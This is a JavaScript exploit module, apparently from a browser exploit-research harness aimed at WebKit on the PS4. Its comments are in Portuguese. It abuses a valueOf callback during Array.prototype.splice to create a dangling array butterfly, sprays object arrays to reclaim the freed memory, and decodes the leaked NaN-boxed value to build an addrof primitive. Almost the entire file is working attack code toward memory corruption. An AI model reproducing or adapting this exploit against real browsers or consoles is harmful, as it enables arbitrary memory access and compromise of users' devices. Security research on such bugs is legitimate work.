export default {
    id:       'ARRAY_BUTTERFLY_SPLICE_OOB',
    category: 'Exploit',
    risk:     'CRITICAL',
    description:
        'Criação das primitivas addrof e fakeobj via Butterfly Aliasing. ' +
        'Força a sobreposição de um ArrayWithDouble (fantasma) com um ArrayWithContiguous (objetos) ' +
        'reciclando a mesma região de memória no bmalloc para manipulação direta de ponteiros.',

    setup: function() {
        this.results = {};
        
        // 1. O array vulnerável (ArrayWithDouble)
        // Usamos um tamanho esotérico para evitar ruído do navegador
        this.vulnArray = new Array(128).fill(1.11);
        
        // 2. A nossa cobaia (O objeto cujo endereço queremos descobrir)
        this.targetObj = document.createElement('div');
        this.targetObj.id = "HOLY_GRAIL";

        const self = this;
        
        this.evilObject = {
            valueOf: function() {
                // GATILHO: Destrói a butterfly original. O C++ retém o ponteiro fantasma.
                self.vulnArray.length = 0;
                
                // 3. HEAP FENG SHUI: A Inundação de Sobreposição
                // Criamos milhares de arrays de OBJETOS do mesmo tamanho (128)
                self.overlapSpray = new Array(2000);
                for(let i = 0; i < 2000; i++) {
                    let arr = new Array(128).fill(self.targetObj); // ArrayWithContiguous
                    self.overlapSpray[i] = arr;
                }
                
                return 9.99; // Retorno irrelevante para o exploit agora
            }
        };
    },

    trigger: function() {
        try {
            // Activa o Dangling Pointer
            this.vulnArray.splice(0, 5, this.evilObject);
            
            // Se a sobreposição (Aliasing) foi bem sucedida, o vulnArray[0]
            // não vai ter 1.11, mas sim o ponteiro bruto do nosso targetObj!
            this.results.leakedData = this.vulnArray[0];
            
            // Guardamos uma referência ao spray para evitar que o GC o limpe
            this.results.sprayRef = this.overlapSpray;
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        s => s.results.error || 'Splice Executado - Verificando Aliasing',
        
        // O Extrator addrof
        s => {
            let val = s.results.leakedData;
            
            // Se o valor for um número, mas diferente do preenchimento e do nosso canário...
            if (typeof val === 'number' && val !== 1.11 && val !== 9.99 && val !== 0) {
                
                // Desempacotar o Float64 para extrair os bits
                const buf = new ArrayBuffer(8);
                const f64 = new Float64Array(buf);
                const u64 = new BigUint64Array(buf);
                
                f64[0] = val;
                const bits = u64[0];
                
                // O WebKit marca os ponteiros válidos (JSValue Cell). Removemos o lixo do NaN-Boxing.
                const addr = bits & 0x0000FFFFFFFFFFFFn;
                
                // Se o ponteiro for coerente com o Userspace da PS4
                if (addr > 0x100000n) {
                    return `🏆 ADDROF [Sobreposição Perfeita]: 0x${addr.toString(16).toUpperCase()}`;
                } else {
                    return `💥 STALE DATA [Missed Overlap]: Leu ${val}`;
                }
            }
            return 0; // Falhou o alinhamento, tenta no próximo ciclo
        }
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.evilObject = null;
        this.targetObj = null;
        this.overlapSpray = null;
        this.results = {};
    }
};
